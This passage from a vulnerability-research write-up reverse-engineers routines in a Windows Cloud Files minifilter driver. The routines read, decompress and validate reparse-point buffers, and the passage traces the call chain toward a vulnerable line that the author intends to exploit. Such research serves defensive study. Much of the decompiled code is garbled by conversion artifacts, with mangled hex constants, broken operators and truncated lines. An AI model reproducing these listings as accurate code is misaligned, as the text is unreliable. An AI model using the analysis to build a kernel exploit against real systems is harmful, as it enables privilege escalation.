StreamContext $=$ HsmpCtxCreateStreamContext( Context, FileObject, v73, &pool\_memory->GenericReparseBuffer.DataBuffer, LOWORD(v72\[0\]), (struct\_Contextb \*\*)&Context\_01);

The following observations can help with the reading ahead:

▪ The FltGetRequestorProcess function returns a pointer to the process containing the thread that has managed the I/O operation.

HsmOsIsPassThroughModeEnabled manages 32-bit requests (Wow64), associated flags, and checks and adjusts necessary privileges. The code remembers similar approaches used by malware threats (mainly ransomware) to bypass file system redirection and encrypt 64-bit files, where the key step is managing 32-bit processes. Of course, this is not the case.

FltQueryInformationFile function retrieves information associated with a file. The file information class is FileAttributeTagInformation function, whose type is FILE\_ATTRIBUTE-TAG\_INFORMATION, a structure that contains FileAttributes and ReparseTag as members. One of possible file attributes to be evaluated is exactly FILE\_ATTRIBUTE\_REPARSE\_POINT, and the associated reparse tag will be saved to be used by the code.

The HsmiCldGetSyncRootFileIdByFileObject routine is, as expected, a specific routine of Cloud Filters, and it retrieves the sync root containing the file identified by the passed object. On time: the sync root is a local folder (directory) used as an entry point (reference point) for synchronizing files in the cloud, such as in the case of OneDrive (we see its icon in File Explorer), for example.

Before proceeding with the analysis up to the HsmpCtxCreateStreamContext call, there are other aspects that deserve attention. The HsmpRpReadBuffer routine indicates that the code allocates a \_REPARSE\_DATA\_BUFFER pool, as shown by arguments passed to ExAllocatePoolWithTag function. The FltFsControlFile function sends a control code (FSCTL\_GET\_REPARSE\_POINT) to the file system drivers to retrieve the reparse point data associated with the file (or directory).

\_\_int64 \_\_fastcall HsmpRpReadBuffer( PFLT\_INSTANCE Instance, PFILE\_OBJECT FileObject, \_REPARSE\_DATA\_BUFFER \*\*P\_DstRpBuf) \*P\_DstRpBuf $=$ 0LL; size $=$ 1024; OutputBuffer $=$ (\_REPARSE\_DATA\_BUFFER $\\star$ )ExAllocatePoolWithTag( PagedPool, 0x400uLL, 'pRsH'); P\_SrcRpBuf $=$ OutputBuffer; if...

status $=$ FltFsControlFile( Instance, FileObject, FSCTL\_GET\_REPARSE\_POINT, 0LL, 0, OutputBuffer, 0x400u, 0LL);

HsmDbgBreakOnStatus(status); if ( status $= =$ (unsigned int)STATUS\_BUFFER\_TOO\_SMALL \|\| status $= =$ (unsigned int)STATUS\_BUFFER\_OVERFLOW ) { ExFreePoolWithTag(P\_SrcRpBuf, 'pRsH'); size $=$ $\\Theta \\times 4 \\Theta \\Theta \\Theta$ ; p\_reparse\_data $=$ (\_REPARSE\_DATA\_BUFFER $\\star$ )ExAllocatePoolWithTag( PagedPool, $\\Theta \\times$ 4000uLL, 'pRsH'); P\_SrcRpBuf $=$ p\_reparse\_data; if ( p\_reparse\_data ) { status $=$ FltFsControlFile( Instance, FileObject, FSCTL\_GET\_REPARSE\_POINT, 0LL, 0, p\_reparse\_data, 0x4000u, 0LL); HsmDbgBreakOnStatus(status); goto LABEL\_4; } status $=$ STATUS\_INSUFFICIENT\_RESOURCES; HsmDbgBreakOnStatus(STATUS\_INSUFFICIENT\_RESOURCES); $\\vee \\underline { { { 1 } } } \\bot =$ WPP\_GLOBAL\_Control; if... $\\vee 1 2 ~ = ~ 1 7$ ;

LABEL\_18: LODWORD(v18) $=$ STATUS\_INSUFFICIENT\_RESOURCES;

LABEL\_4: if... if ( size $\\textless$ P\_SrcRpBuf->ReparseDataLength ) { status $=$ STATUS\_NOT\_A\_REPARSE\_POINT; HsmDbgBreakOnStatus(STATUS\_NOT\_A\_REPARSE\_POINT); if... goto LABEL\_8; } status $=$ HsmpRpiDecompressBuffer(P\_SrcRpBuf, size, P\_DstRpBuf);

A few observations follow:

The first allocation using ExFreePoolWithTag function (1 KB) works as a test for limits because the code does not know the exact size of the input data. Thus, it tries to retrieve the reparse point and checks whether the allocated buffer size is enough. The real attempt at allocating a buffer to retrieve the full reparse point data is the second one, which allocates 16 KB. A bit later in the code, there is a test ( if ( size $<$ P\_SrcRpBuf->ReparseDataLength ) ) to ensure that the allocated buffer is enough to contain the passed reparse point data. If the test fails then there is something wrong (maybe data is corrupted) and it is better to bail out to avoid buffer overflow.

The next routine is named HsmpRpiDecompressBuffer, whose name is very descriptive, and has the following content:

\_\_int64 HsmpRpiDecompressBuffer( \_REPARSE\_DATA\_BUFFER \*P\_SrcRpBuf, int size, \_REPARSE\_DATA\_BUFFER \*\*P\_DstRpBuf, ...) FinalUncompressedSize $=$ va\_arg(va1, \_QWORD); v4 = P\_SrcRpBuf->ReparseTag & $\\Theta \\times$ FFFF0FFF; LODWORD(FinalUncompressedSize) $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; if ( v4 $= =$ dword\_1C0023590 ) { if ( P\_SrcRpBuf->ReparseDataLength $\\textless$ 4u \|\| (Length $=$ P\_SrcRpBuf->GenericReparseBuffer.DataBuffer.Length, (unsigned \_\_int16)(Length - 4) $>$ 16380u) ) { HsmDbgBreakOnCorruption(); HsmDbgBreakOnStatus(STATUS\_CLOUD\_FILE\_METADATA\_CORRUPT); return 0xC000CF02LL; } else if ( (\*(\_DWORD $\\star$ )&P\_SrcRpBuf->GenericReparseBuffer.DataBuffer.Flags &

FILE\_NO\_COMPRESSION) ! $\\qquad = \\quad \\Theta$ ) { Adjusted\_Len $=$ Length + 8; p\_buffer $=$ (\_REPARSE\_DATA\_BUFFER $\\star$ )ExAllocatePoolWithTag( PagedPool, (unsigned int)(Length + 8), 'pRsH'); mem\_pool $=$ p\_buffer; if ( p\_buffer ) { \*(\_QWORD \*)&p\_buffer->ReparseTag $=$ \*(\_QWORD $\\star$ )&P\_SrcRpBuf->ReparseTag; \*(\_DWORD $\\star$ )&p\_buffer->GenericReparseBuffer.DataBuffer.Flags $=$ \*(\_DWORD

\*)&P\_SrcRpBuf->GenericReparseBuffer.DataBuffer.Flags; status\_Decompress $=$ RtlDecompressBuffer( 2u, (PUCHAR)&p\_buffer-> GenericReparseBuffer.DataBuffer.FileData, Adjusted\_Len - 12,

(PUCHAR)&P\_SrcRpBuf->

GenericReparseBuffer.DataBuffer.FileData, size - 12,

(PULONG)FinalUncompressedSize\_1);

\[Figure 72\]: HsmpRpiDecompressBuffer routine

Likely the valid points to comment on are:

▪ The code evaluates if the provided reparse data is between limits (more than 4 bytes and less than 16 KB). If it is not, the status is set to STATUS\_CLOUD\_FILE\_METADATA\_CORRUPT.

It evaluates if the reparse data stream is not already decompressed. If it is not, the RltDecompressBuffer is called to uncompress it.

▪ In the ExAllocatePoolWithTag function, the NumberOfBytes parameter is Length $^ { + 8 }$ . It is necessary to allocate space for data and fields before DataBuffer in \_REPARSE\_DATA\_BUFFER structure:

ReparseTag: 4 bytes (ULONG) ReparseDataLength: 2 bytes (USHORT) Reserved: 2 bytes (USHORT)

▪ Finally, it calls the RtlDecompressBuffer function, which readers are used to analyzing, but it still requires attention to trivial details.

In the \_HSM\_REPARSE\_DATA chain of structures (the second one within the first one), the code does the reverse path and considers only the data size. Therefore, it is necessary to subtract the first two members (Flags and Length) of the \_HSM\_REPARSE\_DATA structure, and the same 8 bytes added previously. At the end, the argument is size - 12.

Finally, we can return our analysis to HsmpSetupContexts routine, which calls HsmpCtxCreateStreamContext routine (a really lengthy procedure), whose first part of the content follows:

\_\_int64 \_\_fastcall HsmpCtxCreateStreamContext( RETURNED\_CONTEXT \*Context\_01, struct \_FILE\_OBJECT \*ptr\_file\_object, \_\_int64 a3, \_HSM\_REPARSE\_DATA \*Buffer, unsigned int size, struct\_Contextb \*\*a6)

{ status $=$ HsmiCtxGetOrCreateFileContext( Context\_01, ptr\_file\_object, a3, &RetContext); HsmDbgBreakOnStatus(status); if... RetContext\_02 $=$ RetContext;

v117 = $\\star$ (\_QWORD \*)(RetContext + 32);

status $=$ FltAllocateContext( Filter, FLT\_STREAM\_CONTEXT, 0xA8uLL, (POOL\_TYPE)POOL\_NX\_ALLOCATION, (PFLT\_CONTEXT $\\star$ )&Context);

memset(Context, 0, sizeof(struct\_Contextb));

Context->tag $=$ 'cSsH';

validate\_status $=$ HsmpRpValidateBuffer(Buffer, size);

In a few words, the code allocated a stream context structure, which contains custom metadata and allows us to associate it with a file stream (the data itself). In this case, it will probably be used to track cloud file hydration status, and other information related to the filter file stream, and as we do not have the context structure definition (created by developers), we do not know what kind of metadata is hold. Furthermore, there is not any public reference on the meaning of HsSc tag, and I cannot confirm its actual description.

Let us pause our analysis of the HsmpCtxCreateStreamContext routine, and examine the HsmpRpValidBuffer routine, whose understanding is key for getting a better comprehension of the minifilter drivers, writing intermediate proof-of-concepts and mainly the exploit itself. A part of its content is as follows:

\_\_int64 \_\_fastcall HsmpRpValidateBuffer( \_HSM\_REPARSE\_DATA \*Buffer, unsigned int RemainingLength\_arg)

{ // \[COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND\] RemainingLength $=$ RemainingLength\_arg - 4; HsmData $=$ &Buffer->FileData; VerificationStage $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; if ( RemainingLength $< ~ \\odot \\times \\underline { { 1 } } \ : 8$ ) goto REPORT\_CORRUPTION; VerificationStage $= ~ 1$ ; if ( HsmData->Magic ! $=$ HSM\_FILE\_MAGIC ) // FeRp goto REPORT\_CORRUPTION; VerificationStage $=$ HSM\_DATA\_HAVE\_CRC; if ( (Buffer->FileData.Flags & HSM\_DATA\_HAVE\_CRC) ! $=$ 0 && Buffer->FileData.Crc32 ! $=$ RtlComputeCrc32( 0, (PUCHAR)&Buffer->FileData.Length, RemainingLength - 8) ) { goto REPORT\_CORRUPTION; } Length\_ReparseData $=$ Buffer->FileData.Length; VerificationStage $= 3$ ; if ( RemainingLength $\\angle$ (unsigned int)Length\_ReparseData ) goto REPORT\_CORRUPTION;

NumberOfElements $=$ Buffer->FileData.NumberOfElements;

VerificationStage $= 4$ ;

if ( !(\_WORD)NumberOfElements ) goto REPORT\_CORRUPTION;

HSM\_MIN\_DATA\_SIZE $= 8 \\times$ NumberOfElements $^ +$ HSM\_XXX\_DATA\_SIZE;

VerificationStage $= ~ 5$ ;

if ( HSM\_MIN\_DATA\_SIZE $> =$ Length\_ReparseData ) goto REPORT\_CORRUPTION;

VerificationStage $=$ $\\Theta \\times \\underline { { 1 } } \\odot \\odot \\odot \\odot$ ;

for ( ElementCount $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; ; ++ElementCount ) { NumerOfElements $=$ Buffer->FileData.NumberOfElements; if ( (unsigned int)NumberOfElements >= 10 ) NumerOfElements $\\qquad = \\quad \\perp \\odot$ ; if ( ElementCount $> =$ NumerOfElements ) break; if ( HsmData->ElementInfos\[ElementCount\].Type $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MA goto REPORT\_CORRUPTION; ElementOffset $=$ Buffer->FileData.ElementInfos\[ElementCount\].Offset; if ( (\_DWORD)ElementOffset ) { if ( ElementOffset $\\textless$ HSM\_MIN\_DATA\_SIZE ) goto REPORT\_CORRUPTION; } if ( (unsigned int)ElementOffset $>$ (unsigned int)Length\_ReparseData ) goto REPORT\_CORRUPTION; ElementLength $=$ Buffer->FileData.ElementInfos\[ElementCount\].Length; if ( ElementLength $>$ (unsigned int)Length\_ReparseData ) goto REPORT\_CORRUPTION; DataLength $=$ ElementOffset $^ +$ ElementLength; if ( DataLength $\\angle$ (unsigned int)ElementOffset DataLength $>$ (unsigned int)Length\_ReparseData ) goto REPORT\_CORRUPTION; ++VerificationStage; }

if ( (VerificationStage $=$ $\\Theta \\times 2 \\Theta \\odot \\Theta \\odot$ , (unsigned int)Length\_ReparseData $\\textless$ $\\Theta \\times \\bot 8$ ) \|\| (Type\_Element\_00 $=$ Buffer->FileData.ElementInfos\[0\].Type, Type\_Element\_00 $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) (ElementOffset\_00 $=$ Buffer->FileData.ElementInfos\[0\].Offset, (\_DWORD)ElementOffset\_00) && ElementOffset\_00 $\\angle$ HSM\_MIN\_DATA\_SIZE \| (unsigned int)ElementOffset\_00 $>$ (unsigned int)Length\_ReparseData \| (Element\_Length\_00 $=$ Buffer->FileData.ElementInfos\[0\].Length, Element\_Length\_00 $>$ (unsigned int)Length\_ReparseData) Element\_Length\_00 $^ +$ (unsigned int)ElementOffset\_00 $\\textless$ (unsigned

int)ElementOffset\_00 Element\_Length\_00 $^ +$ (unsigned int)ElementOffset\_00 $>$ (unsigned

nt)Length\_ReparseData Type\_Element\_00 ! $\\scriptscriptstyle -$ HSM\_ELEMENT\_TYPE\_BYTE Element\_Length\_00 ! $=$ 1 (VerificationStage $=$ $\\Theta \\times 2 \\Theta \\odot \\odot 1$ , \*((\_BYTE $\\star$ )&HsmData->Magic $^ +$ ElementOffset\_00) > 1u) )

{ HsmDbgBreakOnCorruption(); IsReparseBufferSupported $=$ STATUS\_CLOUD\_FILE\_METADATA\_CORRUPT; HsmDbgBreakOnStatus(STATUS\_CLOUD\_FILE\_METADATA\_CORRUPT); if.. return (unsigned int)IsReparseBufferSupported; } if ( (unsigned \_int16)NumberOfElements $>$ 1u && (unsigned int)Length\_ReparseData $> = 0 \\times 2 0$ && (Type\_Element\_01 $=$ Buffer->FileData.ElementInfos\[1\].Type, Type\_Element\_01 $\\angle$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) && ((Offset\_Element\_01 $=$ Buffer->FileData.ElementInfos\[1\].Offset, !( _DWORD)Offset\_Element\_01) \| Offset\_Element\_01 $> =$ HSM\_MIN\_DATA\_SIZE) && (unsigned int)Offset\_Element\_01 $< =$ (unsigned int)Length\_ReparseData && (Length\_Element\_01 $=$ Buffer->FileData.ElementInfos\[1\].Length, Length\_Element\_01 $< =$ (unsigned int)Length\_ReparseData) && Length\_Element\_01 $^ +$ (unsigned int)Offset\_Element\_01 $> =$ (unsigned_

_int)Offset\_Element\_01 && Length\_Element\_01 $^ +$ (unsigned int)Offset\_Element\_01 $< =$ (unsigned_

_int)Length\_ReparseData && Type\_Element\_01 $=$ HSM\_ELEMENT\_TYPE\_UINT32 && Length\_Element $\_ { \\odot } 1 \ = \ 4$ ) { Element $=$ \*(ULONG $\\star$ )((char $\\star$ )&HsmData->Magic $^ +$ Offset\_Element\_01); IsReparseBufferSupported $\\begin{array} { r l } { = } & { { } \\odot } \\end{array}$ ; } Length\_Data\_04 $=$ Buffer->FileData.Length; if ( Length\_Data\_04 >= $\\Theta \\times \\bot 8$ ) { NumberOfElements_ $\\begin{array} { r l } { \\Theta 4 } & { { } = } \\end{array}$ Buffer->FileData.NumberOfElements; if ( (unsigned \_\_int16)NumberOfElements\_04 $< =$ 4u \|\| Length\_Data\_04 $\\angle$ $\\Theta \\times 3 8$ \|\| (Type\_Element\_04 $=$ Buffer->FileData.ElementInfos\[4\].Type, Type\_Element\_04 $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) \|\| (Offset\_Element\_04 $=$ Buffer->FileData.ElementInfos\[4\].Offset, (\_DWORD)Offset\_Element\_04) && Offset\_Element\_04 < 8 $\\star$ NumberOfElements\_04 $^ +$ (unsigned \_\_int64)HSM\_XXX\_DATA\_SIZE \|\| (unsigned int)Offset\_Element\_04 $>$ Length\_Data\_04 \|\| (Length\_Element\_04 $=$ Buffer->FileData.ElementInfos\[4\].Length, Length\_Element\_04 $>$ Length\_Data\_04) Length\_Element\_04 $^ +$ (unsigned int)Offset\_Element\_04 $\\textless$ (unsigned

int)Offset\_Element\_04 Length\_Element\_04 $^ +$ (unsigned int)Offset\_Element\_04 $>$ Length\_Data\_04 \|\| Type\_Element\_04 ! $=$ HSM\_ELEMENT\_TYPE\_BITMAP ) { status\_04 $=$ STATUS\_NOT\_FOUND; } else { if ( (\_DWORD)Offset\_Element\_04 && (\_WORD)Length\_Element\_04 ) Element\_04 $=$ (\_HSM\_DATA $\\star$ )((char $\\star$ )HsmData $^ +$ Offset\_Element\_04); BitmapLength $=$ Buffer->FileData.ElementInfos\[4\].Length; status\_04 = 0;

} if ( status\_04 < 0 ) BitmapLength $\\begin{array} { r l } { \\mathrm { ~ ~ { ~ = ~ } ~ } } & { { } \\odot } \\end{array}$ ; } else { status\_04 $=$ STATUS\_NOT\_FOUND; } HsmDbgBreakOnStatus(status\_04); if ( status\_04 >= 0 ) { IsReparseBufferSupported $=$ HsmpBitmapIsReparseBufferSupported( Element\_04, BitmapLength); HsmDbgBreakOnStatus(IsReparseBufferSupported); if... } Length\_Data\_05 $=$ Buffer->FileData.Length; if ( Length\_Data $\_ { \\odot } 5 < \\odot \\times 1 8$ )

A few comments follow below:

▪ At its start, the code subtracts four bytes (RemainingLength $=$ RemainingLength\_arg - 4) because the \_HSM\_REPARSE\_DATA has three fields, and subtracting four bytes skips the first two fields, which are Flags and Length (both USHORT type).

Using the same approach, the remaining length is checked and if it has less than ${ 0 } { \\times 1 } { 8 }$ bytes the routine returns REPORT\_CORRUPTION. Why? Because the \_HSM\_DATA, which is the type of FileData (third member of \_HSM\_REPARSE\_DATA), holds five first members (16 bytes) and its fifth member (\_HSM\_ELEMENT\_INFO ElementInfos), has another 8 bytes (at least). Therefore, any buffer whose size is smaller than 0x18 certainly will be corrupted.

In the next instructions, the routine checks If the magic number corresponds to a reparse point tag $( { \\mathsf { F e R p } } = = { \\mathsf { H S } } { \\mathsf { I } }$ M\_FILE\_MAGIC) and validates its integrity by checking its checksum. Finally, there is another verification to ensure that the previously calculated length (passed to the routine) matches with the length reported by the buffer.

The instruction HSM\_MIN\_DATA\_SIZE $= 8$ \* NumberOfElements $^ +$ HSM\_XXX\_DATA\_SIZE followed by the code if (LIMIT\_SIZE $> =$ Length\_ReparseData) presents the same approach because the size of \_HSM\_DATA is 16 bytes, and each element (\_HSM\_ELEMENT\_INFO) has 8 bytes. Therefore, if the length of the passed data is smaller than HSM\_MIN\_DATA\_SIZE then it means that its structure composition is corrupted.

▪ Another checking is HsmData->ElementInfos\[ElementCount\].Type $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX, which is related to \_HSM\_CONSTANTS enumeration declared previously, and whose HSM\_ELEMENT\_TYPE\_MAX constant represents the minimum value of an element size (already discussed).

▪ The next instruction checks if the number of elements is greater than 10. If it is then the code sets NumberOfElements to exactly 10. The conclusion is that the code supports the maximum of 10 elements (0 to 9).

▪ Most of code is really repetitive, and for each element (I have truncated the code above on purpose), the routine checks if:

Element 00: HSM\_ELEMENT\_TYPE\_BYTE Element 01: HSM\_ELEMENT\_TYPE\_UINT32 Element 02: HSM\_ELEMENT\_TYPE\_UINT64 Element 04: HSM\_ELEMENT\_TYPE\_BITMAP Element 05: HSM\_ELEMENT\_TYPE\_BITMAP Element 06: HSM\_ELEMENT\_TYPE\_BITMAP

▪ It is clear that not all elements necessarily need exist, specially the last two which are from the same type as the element 04.

When the element type is HSM\_ELEMENT\_TYPE\_BITMAP, there is an additional routine named HsmpBitmapIsReparseBufferSupported that performs additional processing. A part of this routine is shown below:

\_\_int64 \_\_fastcall HsmpBitmapIsReparseBufferSupported( \_HSM\_DATA \*ptrBitmap, unsigned int BitmapLength)

{ if ( BitmapLength $\\textless$ 0x18 ) goto LABEL\_94; stage\_checking $= ~ 1$ ; if ( ptrBitmap->Magic ! $\\llcorner$ HSM\_BITMAP\_MAGIC ) // BtRp goto LABEL\_94; stage\_checking $=$ HSM\_DATA\_HAVE\_CRC; if ( (ptrBitmap->Flags & HSM\_DATA\_HAVE\_CRC) != 0 && ptrBitmap->Crc32 ! $=$ RtlComputeCrc32( 0, (PUCHAR)&ptrBitmap->Length, BitmapLength - 8) ) Length\_Bitmap $=$ ptrBitmap->Length; stage\_checking $= 3$ ; if ( BitmapLength $\\textless$ (unsigned int)Length\_Bitmap ) goto LABEL\_94; nElements\_Bitmap $=$ ptrBitmap->NumberOfElements; stage\_checking $= 4$ ; if ( !(\_WORD)nElements\_Bitmap ) goto LABEL\_94; HSM\_MIN\_DATA\_SIZE $= 8 \\times$ nElements\_Bitmap + HSM\_XXX\_DATA\_SIZE; stage\_checking $= ~ 5$ ; if ( HSM\_MIN\_DATA\_SIZE $> =$ Length\_Bitmap ) goto LABEL\_94; stage\_checking $=$ $\\Theta \\times \\underline { { 1 } } \\odot \\odot \\odot \\odot$ ; for ( counter $=$ 0; ; ++counter ) { NumberOfElements\_Bitmap $=$ ptrBitmap->NumberOfElements; if ( (unsigned \_\_int16)nElements\_Bitmap $> =$ 5u ) NumberOfElements\_Bitmap $= 5$ ; if ( counter $> =$ NumberOfElements\_Bitmap ) break; if ( ptrBitmap->ElementInfos\[counter\].Type $> =$ (unsigned int)HSM\_ELE goto LABEL\_94; Offset\_Element $=$ ptrBitmap->ElementInfos\[counter\].Offset; if ( (\_DWORD)Offset\_Element ) { if ( Offset\_Element $\\angle$ HSM\_MIN\_DATA\_SIZE ) goto LABEL\_94; } if ( (unsigned int)Offset\_Element $>$ (unsigned int)Length\_Bitmap ) goto LABEL\_94; Length\_Element $=$ ptrBitmap->ElementInfos\[counter\].Length; if ( Length\_Element $>$ (unsigned int)Length\_Bitmap ) goto LABEL\_94; element\_size $=$ Offset\_Element $^ +$ Length\_Element; if ( element\_size $\\textless$ (unsigned int)Offset\_Element \|\| element\_size $>$ (unsigned int)Length\_Bitmap ) ++stage\_checking; } if ( (stage\_checking $=$ $\\Theta \\times 2 \\Theta \\odot \\Theta \\odot$ , (unsigned int)Length\_Bitmap $\\angle$ $\\Theta \\times \\bot 8$ ) \|\| (Type\_Element\_00 $\\scriptscriptstyle -$ ptrBitmap->ElementInfos\[0\].Type, Type\_Element\_00 $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) \|\| (Offset\_Element\_00 $=$ ptrBitmap->ElementInfos\[0\].Offset, (\_DWORD)Offset\_Element\_00) && Offset\_Element\_00 $\\textless$ HSM\_MIN\_DATA\_SIZE \|\| (unsigned int)Offset\_Element\_00 $>$ (unsigned int)Length\_Bitmap \|\| (Length\_Element\_00 $=$ ptrBitmap->ElementInfos\[0\].Length, Length\_Element\_00 $>$ (unsigned int)Length\_Bitmap) \|\| Length\_Element\_00 $^ +$ (unsigned int)Offset\_Element\_00 $\\angle$ (unsigned

int)Offset\_Element\_00 \|\| Length\_Element\_00 $^ +$ (unsigned int)Offset\_Element\_00 $>$ (unsigned

int)Length\_Bitmap Type\_Element\_00 ! $=$ HSM\_ELEMENT\_TYPE\_BYTE (\_WORD)Length\_Element\_00 ! $= ~ 1$ \|\| (stage\_checking $=$ $\\Theta \\times 2 \\Theta \\odot \\odot 1$ , \*((\_BYTE $\\star$ )&ptrBitmap->Magic $^ +$ Offset\_Element\_00) $>$ 1u) ) {

LABEL\_94: HsmDbgBreakOnCorruption(); status\_00 $=$ STATUS\_CLOUD\_FILE\_METADATA\_CORRUPT; return status\_00; } status\_00 $=$ STATUS\_NOT\_FOUND; if ( (unsigned \_ _int16)nElements\_Bitmap $>$ 2u && (unsigned int)Length\_Bitmap $> = \\textcircled { \\cdot } \\times 2 8$ && (Type\_Element\_02 $=$ ptrBitmap->ElementInfos\[2\].Type, Type\_Element\_02 $\\angle$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) && ((Offset\_Element_ $\\begin{array} { r l } { ( \\cdot ) 2 } & { { } = } \\end{array}$ ptrBitmap->ElementInfos\[2\].Offset, !( _DWORD)Offset\_Element\_02) \|\| Offset\_Element\_02 $> =$ HSM\_MIN\_DATA\_SIZE) && (unsigned int)Offset\_Element\_02 $< =$ (unsigned int)Length\_Bitmap && (Length\_Element\_02 $=$ ptrBitmap->ElementInfos\[2\].Length, Length\_Element\_02 $< =$ (unsigned int)Length\_Bitmap) && Length\_Element\_02 $^ +$ (unsigned int)Offset\_Element\_02 $> =$ (unsigned_

_int)Offset\_Element\_02 && Length\_Element\_02 $^ +$ (unsigned int)Offset\_Element\_02 $< =$ (unsigned_

_int)Length\_Bitmap && Type\_Element\_ $\\begin{array} { r l } { \\Theta 2 } & { { } = = } \\end{array}$ HSM\_ELEMENT\_TYPE\_BYTE && (\_WORD)Length\_Element $\_ - \\odot 2 \ = \ 1$ ) { index\_element\_02 $=$ $\\star$ ((\_BYTE $\\star$ )&ptrBitmap->Magic $^ +$ Offset\_Element\_02); status_ $\\mathrm { . 0 2 ~ \\Omega = ~ \\mathrm { 0 } }$ ; } else { status\_02 $=$ STATUS\_NOT\_FOUND; } if ( !index\_element\_02 ) {

LABEL\_66: if ( index\_element\_02 $< =$ 1u ) { Length\_Bitmap\_01 $=$ ptrBitmap->Length; if ( Length\_Bitmap $\\mathbf { \\varepsilon } \_ { - } \\odot 1 \ \\mathbf { \\varepsilon } > = \ \\odot \\times 1 8$ ) { NumberOfElements\_01 $=$ ptrBitmap->NumberOfElements; if ( (unsigned \_\_int16)NumberOfElements\_01 $>$ 1u && Length\_Bitmap $\_ { { \\Theta } 1 } \ \\cap { \ v O } = \ { \ v O } \\odot$ ) { Type\_Element\_01 $=$ ptrBitmap->ElementInfos\[1\].Type; if ( Type\_Element\_01 $\\textless$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX ) { Offset\_Element\_01 $=$ ptrBitmap->ElementInfos\[1\].Offset; if ( (!( _DWORD)Offset\_Element\_01 \|\| Offset\_Element\_01 >= 8 $\\star$ NumberOfElements\_01 $^ +$ 16) && (unsigned int)Offset\_Element\_01 $< =$ Length\_Bitmap\_01 ) { Length\_Element\_01 $=$ ptrBitmap->ElementInfos\[1\].Length; if ( Length\_Element\_01 $< =$ Length\_Bitmap\_01 && Length\_Element\_01 $^ +$ (unsigned int)Offset\_Element\_01 $> =$ (unsig_

_int)Offset\_Element\_01 && Length\_Element\_01 $^ +$ (unsigned int)Offset\_Element\_01 $< =$_

_Length\_Bitmap\_01 && Type\_Element\_01 $=$ HSM\_ELEMENT\_TYPE\_BYTE && (\_WORD)Length\_Element $\_ - \\odot 1 ~ = = ~ 1$ ) { ptr\_Element\_01 = \*((\_BYTE $\\star$ )&ptrBitmap->Magic $^ +$ Offset\_Element\_0 status_ $\\begin{array} { l c l } { \\displaystyle { . 0 \\Theta } } & { = } & { \\displaystyle { \\Theta } } \\end{array}$ ;

Reading the reversed code, we can realize that it is almost identical to HsmpRpValidBuffer routine, there are many similar or even identical lines, and possibly the only points that need to be commented on and highlighted are the following ones:

The tested tag is BtRp ( if ( ptrBitmap->Magic $\ ! =$ HSM\_BITMAP\_MAGIC ) ) Elements 0, 1 and 2 are checked. All tested elements must be HSM\_ELEMENT\_TYPE\_BYTE (0x7) the maximum number of objects is 0x5.

▪ Therefore:

Element 00: HSM\_ELEMENT\_TYPE\_BYTE Element 01: HSM\_ELEMENT\_TYPE\_BYTE Element 02: HSM\_ELEMENT\_TYPE\_BYTE

Once we have concluded the analysis of HsmpRpValidBuffer and HsmpBitmapIsReparseBufferSupported routines, it is time to refresh the sequence of routine being called up to the vulnerable line of code is composed by the following routines:

HsmFltPostQUERY\_OPEN

HsmiFltPostECPCREATE

HsmpSetupContexts

HsmpCtxCreateStreamContext

HsmpRpValidateBuffer

HsmpBitmapIsReparseBufferSupported

HsmIBitmapNORMALOpen

The second part of HsmpCtxCreateStreamContext routine follows below:

validate\_status $=$ HsmpRpValidateBuffer(Buffer, size);

HsmDbgBreakOnStatus(validate\_status);

size\_02 $=$ size - 4;

p\_FileData $=$ &Buffer->FileData;

if ( size $< = ~ 4$ ) size\_02 = 0;

NumElements\_Data\_03 $=$ Buffer->FileData.NumberOfElements;

Length\_Element $\_ { - } \\odot 3 \_ { - } \\odot 1 = \\odot$ ;

if ( (unsigned \_\_int16)NumElements\_Data\_03 $< =$ 3u \|\| (Data\_Length\_03 $=$ Buffer->FileData.Length, Data\_Length\_03 $\\angle$ $\\Theta \\times 3 \\Theta$ ) \|\| (Type\_Element\_03 $=$ Buffer->FileData.ElementInfos\[3\].Type, Type\_Element\_03 $> =$ (unsigned int)HSM\_ELEMENT\_TYPE\_MAX) \|\| (Offset\_Element\_03 $=$ Buffer->FileData.ElementInfos\[3\].Offset, (\_DWORD)Offset\_Element\_03) && Offset\_Element\_03 < 8 $\\star$ NumElements\_Data\_03 $^ +$ (unsigned \_\_int64)HSM\_XXX\_DATA\_SIZE \|\| (unsigned int)Offset\_Element\_03 $>$ Data\_Length\_03 \|\| (Length\_Element\_03 $=$ Buffer->FileData.ElementInfos\[3\].Length, Length\_Element\_03 $>$ Data\_Length\_03) \|\| Length\_Element\_03 $^ +$ (unsigned int)Offset\_Element\_03 $\\angle$ (unsigned

int)Offset\_Element\_03 \| Length\_Element\_03 $^ +$ (unsigned int)Offset\_Element\_03 $>$ Data\_Length\_03 \|\| Type\_Element\_03 ! $=$ HSM\_ELEMENT\_TYPE\_BITMAP )

{ status\_03 $=$ STATUS\_NOT\_FOUND;

}

else

{ if ( (\_DWORD)Offset\_Element\_03 && ( _WORD)Length\_Element\_03 ) ptr\_buffer $=$ (char \*)p\_FileData $^ +$ Offset\_Element\_03; Length\_Element\_03\_01 $=$ Buffer->FileData.ElementInfos\[3\].Length; status_ $\\begin{array} { l l l } { \\displaystyle \\Theta 3 } & { = } & { \\Theta } \\end{array}$ ;

}

if ( status\_03 > $=$ 0 && ptr\_buffer && Length\_Element\_03\_01 )

{ Context->ptr\_buffer $=$ ExAllocatePoolWithTag( PagedPool, Length\_Element\_03\_01, 'iFsH'); ptr\_buffer\_01 $=$ (void $\\star$ )Context->ptr\_buffer; if... memmove(ptr\_buffer\_01, ptr\_buffer, Length\_Element\_03\_01); Context->length $=$ Length\_Element\_03\_01; Context\_02 $=$ Context;

